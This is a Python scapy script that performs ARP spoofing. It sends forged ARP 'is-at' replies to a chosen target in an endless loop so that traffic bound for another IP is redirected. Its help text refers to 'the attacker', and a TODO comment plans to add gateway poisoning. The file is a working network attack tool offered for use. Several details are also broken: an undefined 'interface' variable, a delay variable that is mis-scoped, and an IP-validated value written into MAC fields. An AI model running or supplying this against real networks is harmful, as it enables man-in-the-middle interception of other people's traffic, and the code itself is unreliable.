from scapy.all import *
import argparse
import time

ARP_ISAT_CODE = 2
DELAY_TIME = 0.5
IP_REGEX = "^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"


def getMACbyIP(ip):
    """
    get MAC address of a specified IP.
    """
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
    response = srp1(arp_request, timeout=1, verbose=False)
    if response:
        return(response.src)
    return None

def validate_ip_address(address):
    """
    Validate an ip address for argparse constraint matching.
    """
    if re.match(IP_REGEX, address):
        return address
    raise argparse.ArgumentTypeError('invalid value for ip argument (src or target)')


def spoof(args : dict):
    """
    param args: dictionary of arguments.
    supports: - interface (assuming valid)
              - source
              - delay
              - gw
              - target(required)
    """
    # get target MAC address
    target_mac = getMACbyIP(args['target'][0])

    if not target_mac:
        print("IP target not found")
        return

    # create the arp packet
    arp_isat_packet = Ether(dst=target_mac)/ARP(op=ARP_ISAT_CODE,pdst=args['target'][0],psrc=args['target'][1])

    if args['delay'] is not None:
        DELAY_TIME = args['delay']
    if args["src"] is not None:
        arp_isat_packet[Ether].src = args["src"]
        arp_isat_packet[ARP].hwsrc = args["src"]

    # send the arp packets to the target every DELAY_TIME sec
    while(True):
        sendp(arp_isat_packet, iface=args[interface], verbose=0)

        time.sleep(DELAY_TIME)


def main():
    # initialize argument parser for command line
    parser = argparse.ArgumentParser(description="Spoof ARP tables")
    parser.add_argument("-i","--iface", help="Interface you wish to use", choices=get_if_list())
    parser.add_argument("-s","--src", type=validate_ip_address, help="The address you want for the attacker")
    parser.add_argument("-d","--delay", type=int, help="Delay (in seconds) between messages")
    parser.add_argument("-gw", action='store_true', help="should GW be attacked as well")
    parser.add_argument("-t","--target", help="IP of target", nargs=2, type=validate_ip_address, required=True)


    #TODO: add gw suppurt
    #  gw = conf.route.route("0.0.0.0")[2]
    
    args = parser.parse_args()
    spoof(vars(args))


if __name__ == "__main__":
    main()                                                                     

